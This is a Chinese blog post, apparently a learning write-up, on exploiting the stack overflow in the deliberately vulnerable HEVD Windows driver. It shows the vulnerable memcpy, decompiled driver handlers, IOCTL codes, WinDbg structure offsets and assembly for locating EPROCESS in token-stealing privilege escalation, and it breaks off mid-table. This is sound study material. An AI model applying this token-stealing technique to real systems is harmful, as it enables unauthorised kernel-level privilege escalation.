

<!DOCTYPE html>
<html lang="zh-CN" data-default-color-scheme=auto>



<head>
  <meta charset="UTF-8">
  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.png">
  <link rel="icon" href="/img/favicon.png">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  
  <meta name="theme-color" content="#2f4154">
  <meta name="description" content="漏洞原理栈溢出栈溢出指的是程序向栈中某个变量中写入的字节数超过了这个变量本身所申请的字节数，因而导致与其相邻的栈中的变量的值被改变。">
  <meta name="author" content="Cerises">
  <meta name="keywords" content="">
  <meta name="description" content="漏洞原理栈溢出栈溢出指的是程序向栈中某个变量中写入的字节数超过了这个变量本身所申请的字节数，因而导致与其相邻的栈中的变量的值被改变。">
<meta property="og:type" content="article">
<meta property="og:title" content="Windows 内核漏洞利用学习--（2）栈溢出">
<meta property="og:url" content="https://ceris3s.github.io/2022/02/21/Windows_kernel_exploit_study_stackoverflow/index.html">
<meta property="og:site_name" content="blog">
<meta property="og:description" content="漏洞原理栈溢出栈溢出指的是程序向栈中某个变量中写入的字节数超过了这个变量本身所申请的字节数，因而导致与其相邻的栈中的变量的值被改变。">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://ceris3s.github.io/2022/02/21/Windows_kernel_exploit_study_stackoverflow/1.png">
<meta property="article:published_time" content="2022-02-21T01:24:21.836Z">
<meta property="article:modified_time" content="2020-12-15T15:11:21.727Z">
<meta property="article:author" content="Cerises">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:image" content="https://ceris3s.github.io/2022/02/21/Windows_kernel_exploit_study_stackoverflow/1.png">
  
  <title>Windows 内核漏洞利用学习--（2）栈溢出 - blog</title>

  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/css/bootstrap.min.css" />


  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/github-markdown-css@4/github-markdown.min.css" />
  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />

  
    
    
      
      <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@10/styles/github-gist.min.css" />
    
  

  
    <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3/dist/jquery.fancybox.min.css" />
  


<!-- 主题依赖的图标库，不要自行修改 -->

<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">



<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">


<link  rel="stylesheet" href="/css/main.css" />

<!-- 自定义样式保持在最底部 -->


  <script id="fluid-configs">
    var Fluid = window.Fluid || {};
    var CONFIG = {"hostname":"ceris3s.github.io","root":"/","version":"1.8.12","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname"}},"search_path":"/local-search.xml"};
  </script>
  <script  src="/js/utils.js" ></script>
  <script  src="/js/color-schema.js" ></script>
<meta name="generator" content="Hexo 5.4.1"></head>


<body>
  <header style="height: 70vh;">
    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
  <div class="container">
    <a class="navbar-brand" href="/">
      <strong>ceris3s</strong>
    </a>

    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
            data-target="#navbarSupportedContent"
            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
      <div class="animated-icon"><span></span><span></span><span></span></div>
    </button>

    <!-- Collapsible content -->
    <div class="collapse navbar-collapse" id="navbarSupportedContent">
      <ul class="navbar-nav ml-auto text-center">
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/">
                <i class="iconfont icon-home-fill"></i>
                首页
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/archives/">
                <i class="iconfont icon-archive-fill"></i>
                归档
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/categories/">
                <i class="iconfont icon-category-fill"></i>
                分类
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/tags/">
                <i class="iconfont icon-tags-fill"></i>
                标签
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/about/">
                <i class="iconfont icon-user-fill"></i>
                关于
              </a>
            </li>
          
        
        
          <li class="nav-item" id="search-btn">
            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
              &nbsp;<i class="iconfont icon-search"></i>&nbsp;
            </a>
          </li>
        
        
          <li class="nav-item" id="color-toggle-btn">
            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">&nbsp;<i
                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
          </li>
        
      </ul>
    </div>
  </div>
</nav>

    <div class="banner" id="banner" parallax=true
         style="background: url('/img/default.png') no-repeat center center;
           background-size: cover;">
      <div class="full-bg-img">
        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
          <div class="page-header text-center fade-in-up">
            <span class="h2" id="subtitle" title="Windows 内核漏洞利用学习--（2）栈溢出">
              
            </span>

            
              <div class="mt-3">
  
  
    <span class="post-meta">
      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
      <time datetime="2022-02-21 09:24" pubdate>
        2022年2月21日 上午
      </time>
    </span>
  
</div>

<div class="mt-1">
  
    <span class="post-meta mr-2">
      <i class="iconfont icon-chart"></i>
      14k 字
    </span>
  

  
    <span class="post-meta mr-2">
      <i class="iconfont icon-clock-fill"></i>
      
      
      45 分钟
    </span>
  

  
  
</div>

            
          </div>

          
        </div>
      </div>
    </div>
  </header>

  <main>
    
      

<div class="container-fluid nopadding-x">
  <div class="row nomargin-x">
    <div class="d-none d-lg-block col-lg-2"></div>
    <div class="col-lg-8 nopadding-x-md">
      <div class="container nopadding-x-md" id="board-ctn">
        <div class="py-5" id="board">
          <article class="post-content mx-auto">
            <!-- SEO header -->
            <h1 style="display: none">Windows 内核漏洞利用学习--（2）栈溢出</h1>
            
            <div class="markdown-body">
              <h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><h3 id="栈溢出"><a href="#栈溢出" class="headerlink" title="栈溢出"></a>栈溢出</h3><p>栈溢出指的是程序向栈中某个变量中写入的字节数超过了这个变量本身所申请的字节数，因而导致与其相邻的栈中的变量的值被改变。</p>
<span id="more"></span>

<h3 id="漏洞点分析"><a href="#漏洞点分析" class="headerlink" title="漏洞点分析"></a>漏洞点分析</h3><p>可以看到在安全函数中，RtlCopyMemory对内存拷贝大小进行限制，控制可拷贝内存大小最大是KernelBuffer大小，而漏洞函数却没有对拷贝大小进行限制，可导致栈溢出。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">ifdef</span> SECURE</span><br>        <span class="hljs-comment">//</span><br>        <span class="hljs-comment">// Secure Note: This is secure because the developer is passing a size</span><br>        <span class="hljs-comment">// equal to size of KernelBuffer to RtlCopyMemory()/memcpy(). Hence,</span><br>        <span class="hljs-comment">// there will be no overflow</span><br>        <span class="hljs-comment">//</span><br><br>        RtlCopyMemory((PVOID)KernelBuffer, UserBuffer, <span class="hljs-keyword">sizeof</span>(KernelBuffer));<br><span class="hljs-meta">#<span class="hljs-meta-keyword">else</span></span><br>        DbgPrint(<span class="hljs-string">&quot;[+] Triggering Buffer Overflow in Stack\n&quot;</span>);<br><br>        <span class="hljs-comment">//</span><br>        <span class="hljs-comment">// Vulnerability Note: This is a vanilla Stack based Overflow vulnerability</span><br>        <span class="hljs-comment">// because the developer is passing the user supplied size directly to</span><br>        <span class="hljs-comment">// RtlCopyMemory()/memcpy() without validating if the size is greater or</span><br>        <span class="hljs-comment">// equal to the size of KernelBuffer</span><br>        <span class="hljs-comment">//</span><br><br>        RtlCopyMemory((PVOID)KernelBuffer, UserBuffer, Size);<br></code></pre></td></tr></table></figure>

<p>BUFFER_SIZE是512，KernelBuffer是ULONG类型的，也就是 unsigned long类型，在32位系统中，字节数为4字节；在64位系统中，Visual C++和Mingw64字节数为4字节。GCC（POSIX系统以及Cygwin）为8字节，Clang的与GCC类似，不同平台不同实现。所以sizeof(KernelBuffer)就是0x800.</p>
<p>通过IDA查看函数的执行流</p>
<p><img src="1.png" srcset="/img/loading.gif" lazyload alt="1"></p>
<p>跟进DriverEntry</p>
<figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs xl">NTSTATUS __stdcall DriverEntry(PDRIVER_OBJECT DriverObject, int a2)<br>&#123;<br>  NTSTATUS v2; <span class="hljs-comment">// esi</span><br>  PDEVICE_OBJECT v3; <span class="hljs-comment">// eax</span><br>  LSA_UNICODE_STRING DestinationString; <span class="hljs-comment">// [esp+8h] [ebp-14h]</span><br>  LSA_UNICODE_STRING SymbolicLinkName; <span class="hljs-comment">// [esp+10h] [ebp-Ch]</span><br>  PDEVICE_OBJECT DeviceObject; <span class="hljs-comment">// [esp+18h] [ebp-4h]</span><br><br>  DeviceObject = <span class="hljs-number">0</span>;<br>  *(_DWORD *)&amp;SymbolicLinkName.Length = <span class="hljs-number">0</span>;<br>  SymbolicLinkName.Buffer = <span class="hljs-number">0</span>;<br>  RtlInitUnicodeString(&amp;DestinationString, L<span class="hljs-string">&quot;\\Device\\HackSysExtremeVulnerableDriver&quot;</span>);<br>  RtlInitUnicodeString(&amp;SymbolicLinkName, L<span class="hljs-string">&quot;\\DosDevices\\HackSysExtremeVulnerableDriver&quot;</span>);<br>  v2 = IoCreateDevice(DriverObject, <span class="hljs-number">0</span>, &amp;DestinationString, <span class="hljs-number">0</span>x22u, <span class="hljs-number">0</span>x100u, <span class="hljs-number">0</span>, &amp;DeviceObject);<br>  <span class="hljs-keyword">if</span> ( v2 &gt;= <span class="hljs-number">0</span> )<br>  &#123;<br>    <span class="hljs-function"><span class="hljs-title">memset32</span>(DriverObject-&gt;</span>MajorFunction, (int)IrpNotImplementedHandler, <span class="hljs-number">0</span>x1Cu);<br>    D<span class="hljs-function"><span class="hljs-title">riverObject</span>-&gt;</span>MajorFunction[<span class="hljs-number">14</span>] = (PDRIVER_DISPATCH)IrpDeviceIoCtlHandler;<br>    D<span class="hljs-function"><span class="hljs-title">riverObject</span>-&gt;</span>MajorFunction[<span class="hljs-number">0</span>] = (PDRIVER_DISPATCH)IrpCreateCloseHandler;<br>    D<span class="hljs-function"><span class="hljs-title">riverObject</span>-&gt;</span>MajorFunction[<span class="hljs-number">2</span>] = (PDRIVER_DISPATCH)IrpCreateCloseHandler;<br>    v3 = DeviceObject;<br>    D<span class="hljs-function"><span class="hljs-title">riverObject</span>-&gt;</span>DriverUnload = (PDRIVER_UNLOAD)DriverUnloadHandler;<br>    <span class="hljs-function"><span class="hljs-title">v3</span>-&gt;</span>Flags |= <span class="hljs-number">0</span>x10u;<br>    D<span class="hljs-function"><span class="hljs-title">eviceObject</span>-&gt;</span>Flags &amp;= <span class="hljs-number">0</span>xFFFFFF7F;<br>    v2 = IoCreateSymbolicLink(&amp;SymbolicLinkName, &amp;DestinationString);<br>...<br></code></pre></td></tr></table></figure>

<p>跟进IrpDeviceIoCtlHandler</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs php">NTSTATUS __stdcall IrpDeviceIoCtlHandler(<span class="hljs-keyword">int</span> a1, PIRP Irp)<br>&#123;<br>  NTSTATUS v2; <span class="hljs-comment">// edi</span><br>  _IO_STACK_LOCATION *v3; <span class="hljs-comment">// ebx</span><br>  <span class="hljs-keyword">int</span> v4; <span class="hljs-comment">// eax</span><br>  <span class="hljs-keyword">const</span> CHAR *v6; <span class="hljs-comment">// [esp-4h] [ebp-10h]</span><br><br>  v2 = -<span class="hljs-number">1073741637</span>;<br>  v3 = Irp-&gt;Tail.Overlay.CurrentStackLocation;<br>  <span class="hljs-keyword">if</span> ( v3 )<br>  &#123;<br>    <span class="hljs-keyword">switch</span> ( v3-&gt;Parameters.Read.ByteOffset.LowPart )<br>    &#123;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">0</span>x222003u:<br>        _DbgPrintEx(<span class="hljs-number">0</span>x4Du, <span class="hljs-number">3</span>u, <span class="hljs-string">&quot;****** HEVD_IOCTL_BUFFER_OVERFLOW_STACK ******\n&quot;</span>);<br>        v4 = BufferOverflowStackIoctlHandler((<span class="hljs-keyword">int</span>)Irp, (<span class="hljs-keyword">int</span>)v3);<br>        v6 = <span class="hljs-string">&quot;****** HEVD_IOCTL_BUFFER_OVERFLOW_STACK ******\n&quot;</span>;<br>        <span class="hljs-keyword">goto</span> LABEL_4;<br>       ...<br></code></pre></td></tr></table></figure>

<p>跟进BufferOverflowStackIoctlHandler</p>
<figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs armasm"><span class="hljs-symbol">int</span> __stdcall BufferOverflowStackIoctlHandler(int <span class="hljs-built_in">a1</span>, int <span class="hljs-built_in">a2</span>)<br>&#123;<br>  int <span class="hljs-built_in">v2</span><span class="hljs-comment">; // ecx</span><br>  void *<span class="hljs-built_in">v3</span><span class="hljs-comment">; // edx</span><br><br>  <span class="hljs-built_in">v2</span> = -<span class="hljs-number">1073741823</span><span class="hljs-comment">;</span><br>  <span class="hljs-built_in">v3</span> = *(void **)(<span class="hljs-built_in">a2</span> + <span class="hljs-number">16</span>)<span class="hljs-comment">;</span><br>  <span class="hljs-meta">if</span> ( <span class="hljs-built_in">v3</span> )<br>    <span class="hljs-built_in">v2</span> = TriggerBufferOverflowStack(<span class="hljs-built_in">v3</span>, *(_DWORD *)(<span class="hljs-built_in">a2</span> + <span class="hljs-number">8</span>))<span class="hljs-comment">;</span><br>  return <span class="hljs-built_in">v2</span><span class="hljs-comment">;</span><br>&#125;<br></code></pre></td></tr></table></figure>

<p>再跟进TriggerBufferOverflowStack就是我们的漏洞函数</p>
<figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs reasonml"><span class="hljs-built_in">int</span> __stdcall <span class="hljs-constructor">TriggerBufferOverflowStack(<span class="hljs-params">void</span> <span class="hljs-operator">*</span>Address, <span class="hljs-params">size_t</span> MaxCount)</span><br>&#123;<br>  <span class="hljs-built_in">char</span> Dst; <span class="hljs-comment">// [esp+Ch] [ebp-81Ch]</span><br>  CPPEH_RECORD ms_exc; <span class="hljs-comment">// [esp+810h] [ebp-18h]</span><br><br>  memset(&amp;Dst, <span class="hljs-number">0</span>, <span class="hljs-number">0x800</span>u);<br>  ms_exc.registration.TryLevel = <span class="hljs-number">0</span>;<br>  <span class="hljs-constructor">ProbeForRead(Address, 0x800u, 1u)</span>;<br>  <span class="hljs-constructor">_DbgPrintEx(0x4Du, 3u, <span class="hljs-string">&quot;[+] UserBuffer: 0x%p\n&quot;</span>, Address)</span>;<br>  <span class="hljs-constructor">_DbgPrintEx(0x4Du, 3u, <span class="hljs-string">&quot;[+] UserBuffer Size: 0x%X\n&quot;</span>, MaxCount)</span>;<br>  <span class="hljs-constructor">_DbgPrintEx(0x4Du, 3u, <span class="hljs-string">&quot;[+] KernelBuffer: 0x%p\n&quot;</span>, &amp;Dst)</span>;<br>  <span class="hljs-constructor">_DbgPrintEx(0x4Du, 3u, <span class="hljs-string">&quot;[+] KernelBuffer Size: 0x%X\n&quot;</span>, 2048)</span>;<br>  <span class="hljs-constructor">_DbgPrintEx(0x4Du, 3u, <span class="hljs-string">&quot;[+] Triggering Buffer Overflow in Stack\n&quot;</span>)</span>;<br>  memcpy(&amp;Dst, Address, MaxCount);<br>  return <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>



<h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><p>这里我们用的方法是Token Stealing，什么是token呢？访问令牌（access token）是描述进程或线程的安全上下文的对象。令牌中的信息包括与进程或线程关联的用户帐户的标识和特权。当用户登录时，系统通过与安全数据库中存储的信息进行比较来验证用户的密码。如果密码经过身份验证，系统将生成一个访问令牌。代表此用户执行的每个进程都有此访问令牌的副本。</p>
<p>如果攻击者能够获得对工作站的系统级访问权限，例如通过破坏本地管理员帐户，并且域管理员帐户已登录到该计算机，则攻击者可能只需读取内存中的管理员访问令牌并将其窃取，以允许他们模拟该帐户。</p>
<h4 id="读-写进程令牌（token）"><a href="#读-写进程令牌（token）" class="headerlink" title="读/写进程令牌（token）"></a>读/写进程令牌（token）</h4><p>当线程与安全对象交互或试图执行需要权限的系统任务时，系统使用访问令牌来标识用户。访问令牌包含以下信息：</p>
<figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs ada">kd&gt; dt _TOKEN<br>nt!_TOKEN<br>   +<span class="hljs-number">0</span>x000 TokenSource      : _<span class="hljs-type">TOKEN_SOURCE</span><br>   +<span class="hljs-number">0</span>x010 TokenId          : _<span class="hljs-type">LUID</span><br>   +<span class="hljs-number">0</span>x018 AuthenticationId : _<span class="hljs-type">LUID</span><br>   +<span class="hljs-number">0</span>x020 ParentTokenId    : _<span class="hljs-type">LUID</span><br>   +<span class="hljs-number">0</span>x028 ExpirationTime   : _<span class="hljs-type">LARGE_INTEGER</span><br>   +<span class="hljs-number">0</span>x030 TokenLock        : <span class="hljs-type">Ptr32</span> _ERESOURCE<br>   +<span class="hljs-number">0</span>x034 ModifiedId       : _<span class="hljs-type">LUID</span><br>   +<span class="hljs-number">0</span>x040 Privileges       : _<span class="hljs-type">SEP_TOKEN_PRIVILEGES</span><br>   +<span class="hljs-number">0</span>x058 AuditPolicy      : _<span class="hljs-type">SEP_AUDIT_POLICY</span><br>   +<span class="hljs-number">0</span>x074 SessionId        : <span class="hljs-type">Uint4B</span><br>   +<span class="hljs-number">0</span>x078 UserAndGroupCount : <span class="hljs-type">Uint4B</span><br>   +<span class="hljs-number">0</span>x07c RestrictedSidCount : <span class="hljs-type">Uint4B</span><br>   +<span class="hljs-number">0</span>x080 VariableLength   : <span class="hljs-type">Uint4B</span><br>   +<span class="hljs-number">0</span>x084 DynamicCharged   : <span class="hljs-type">Uint4B</span><br>   +<span class="hljs-number">0</span>x088 DynamicAvailable : <span class="hljs-type">Uint4B</span><br>   +<span class="hljs-number">0</span>x08c DefaultOwnerIndex : <span class="hljs-type">Uint4B</span><br>   +<span class="hljs-number">0</span>x090 UserAndGroups    : <span class="hljs-type">Ptr32</span> _SID_AND_ATTRIBUTES<br>   +<span class="hljs-number">0</span>x094 RestrictedSids   : <span class="hljs-type">Ptr32</span> _SID_AND_ATTRIBUTES<br>   +<span class="hljs-number">0</span>x098 PrimaryGroup     : <span class="hljs-type">Ptr32</span> Void<br>   +<span class="hljs-number">0</span>x09c DynamicPart      : <span class="hljs-type">Ptr32</span> Uint4B<br>   +<span class="hljs-number">0</span>x0a0 DefaultDacl      : <span class="hljs-type">Ptr32</span> _ACL<br>   +<span class="hljs-number">0</span>x0a4 TokenType        : _<span class="hljs-type">TOKEN_TYPE</span><br>   +<span class="hljs-number">0</span>x0a8 ImpersonationLevel : _<span class="hljs-type">SECURITY_IMPERSONATION_LEVEL</span><br>   +<span class="hljs-number">0</span>x0ac TokenFlags       : <span class="hljs-type">Uint4B</span><br>   +<span class="hljs-number">0</span>x0b0 TokenInUse       : <span class="hljs-type">UChar</span><br>   +<span class="hljs-number">0</span>x0b4 IntegrityLevelIndex : <span class="hljs-type">Uint4B</span><br>   +<span class="hljs-number">0</span>x0b8 MandatoryPolicy  : <span class="hljs-type">Uint4B</span><br>   +<span class="hljs-number">0</span>x0bc LogonSession     : <span class="hljs-type">Ptr32</span> _SEP_LOGON_SESSION_REFERENCES<br>   +<span class="hljs-number">0</span>x0c0 OriginatingLogonSession : _<span class="hljs-type">LUID</span><br>   +<span class="hljs-number">0</span>x0c8 SidHash          : _<span class="hljs-type">SID_AND_ATTRIBUTES_HASH</span><br>   +<span class="hljs-number">0</span>x150 RestrictedSidHash : _<span class="hljs-type">SID_AND_ATTRIBUTES_HASH</span><br>   +<span class="hljs-number">0</span>x1d8 pSecurityAttributes : <span class="hljs-type">Ptr32</span> _AUTHZBASEP_SECURITY_ATTRIBUTES_INFORMATION<br>   +<span class="hljs-number">0</span>x1dc VariablePart     : <span class="hljs-type">Uint4B</span><br></code></pre></td></tr></table></figure>

<p>一种常见的方法是用特权进程令牌替换非特权进程令牌。如果特权进程在沙盒中，则该方法可能无效。为了完成它，我们应该知道哪个是非特权进程，哪个是特权进程。</p>
<p>创建一个名为shellcode.exe的程序.  如果我们在cmd.exe运行它，它可以帮助父进程cmd.exe获得更高的特权。该方法的工作原理如下：</p>
<p>➢ 查找当前进程 (shellcode.exe)的EPROCESS .<br>➢ 查找父进程(cmd.exe)的进程ID.<br>➢  从父进程读取ACCESS TOKEN<br>➢查找特权进程的EPROCESS。<br>➢ 从特权进程读取ACCESS TOKEN 。<br>➢ 将父进程的ACCESS TOKEN替换为特权ACCESS TOKEN</p>
<p>问题：如何在进程中定位ACCESS TOKEN是关键？</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">kd</span>&gt; !process <span class="hljs-number">0</span> <span class="hljs-number">0</span> cmd.exe<br><span class="hljs-attribute">PROCESS</span> <span class="hljs-number">87948</span>d<span class="hljs-number">40</span>  SessionId: <span class="hljs-number">1</span>  Cid: <span class="hljs-number">0</span>bc<span class="hljs-number">8</span>    Peb: <span class="hljs-number">7</span>ffd<span class="hljs-number">4000</span>  ParentCid: <span class="hljs-number">05</span>a<span class="hljs-number">4</span><br>    <span class="hljs-attribute">DirBase</span>: <span class="hljs-number">3</span>e<span class="hljs-number">8204</span>c<span class="hljs-number">0</span>  ObjectTable: a<span class="hljs-number">9352158</span>  HandleCount:  <span class="hljs-number">23</span>.<br>    <span class="hljs-attribute">Image</span>: cmd.exe<br></code></pre></td></tr></table></figure>

<figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs gauss">kd&gt; dt nt!_EPROCESS <span class="hljs-number">87948</span>d40 <span class="hljs-built_in">TOKEN</span><br>   +<span class="hljs-number">0x0f8</span> <span class="hljs-built_in">Token</span> : _EX_FAST_REF<br></code></pre></td></tr></table></figure>

<p>Note:   87948d40 是EPROCESS地址</p>
<h5 id="查找当前进程-shellcode-exe-的EPROCESS"><a href="#查找当前进程-shellcode-exe-的EPROCESS" class="headerlink" title="查找当前进程 (shellcode.exe)的EPROCESS"></a>查找当前进程 (shellcode.exe)的EPROCESS</h5><p>问题：如何定位当前进程的EPROCESS？</p>
<p>FS:0x120 →→ _KPCR<br>_KPCR:0x004 →→ _KTHREAD(CurrentThread)<br>_KTHREAD:0x150 →→ _KPROCESS</p>
<p><strong>KPCR</strong>代表（内核）处理器控制区域（(Kernel) Processor Control Region）。 内核为每个逻辑处理器保留一个KPCR。 引导处理器的KPCR位于加载程序提供的空间中，或者位于内核的.data部分，但是每个附加处理器的KPCR处于内核在一个内存分配中构建的大规模每个处理器状态的开始。 例如，在6.0版中：<br>内核模式代码可以轻松找到正在执行的任何处理器的KPCR，因为当处理器最后一次进入ring 0时，无论它到达那里，内核都会在32位和64位Windows中加载<strong>fs</strong>或<strong>gs</strong>寄存器，来寻址该处理器的KPCR。</p>
<p><strong>KTHREAD</strong>:  KTHREAD结构是ETHREAD结构的内核核心部分。 ETHREAD结构是线程对象的内核表示。</p>
<p><strong>KPROCESS</strong> :  KPROCESS结构是EPROCESS 结构的内核核心部分。EPROCESS结构是进程对象的内核表示</p>
<figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs ada">kd&gt; dt _KPCR -r<br>...<br>   +<span class="hljs-number">0</span>x120 PrcbData         : _<span class="hljs-type">KPRCB</span><br>      +<span class="hljs-number">0</span>x000 MinorVersion     : <span class="hljs-type">Uint2B</span><br>      +<span class="hljs-number">0</span>x002 MajorVersion     : <span class="hljs-type">Uint2B</span><br>      +<span class="hljs-number">0</span>x004 CurrentThread    : <span class="hljs-type">Ptr32</span> _KTHREAD<br>      <br></code></pre></td></tr></table></figure>

<figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sqf">kd&gt; dt <span class="hljs-variable">_KTHREAD</span> Process<br>ntdll!<span class="hljs-variable">_KTHREAD</span><br>   +<span class="hljs-number">0</span>x150 Process : Ptr32 <span class="hljs-variable">_KPROCESS</span><br></code></pre></td></tr></table></figure>

<p>在汇编代码中，当前进程的EPROCESS地址可以通过以下指令找到：</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-keyword">mov</span> <span class="hljs-built_in">eax</span>, <span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> <span class="hljs-built_in">fs</span>:[<span class="hljs-number">124h</span>] <span class="hljs-comment">;get _ETHREAD pointer from KPCR</span><br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">eax</span>, <span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">eax</span> + <span class="hljs-number">150h</span>]<br></code></pre></td></tr></table></figure>



<h5 id="查找父进程-cmd-exe-的进程ID"><a href="#查找父进程-cmd-exe-的进程ID" class="headerlink" title="查找父进程(cmd.exe)的进程ID"></a>查找父进程(cmd.exe)的进程ID</h5><p>当shellcode.exe在cmd.exe中执行时，可以将其视为子进程，而cmd.exe是父进程。 在这里，我们为父进程（cmd.exe）获得了更高的特权。 为了将权限转移到目标程序（例如：cmd.exe），我们首先应该找到cmd.exe的访问令牌。 例如：878784d0是当前进程的EPROCESS地址。</p>
<table>
<thead>
<tr>
<th>父进程</th>
<th>子进程（当前进程）</th>
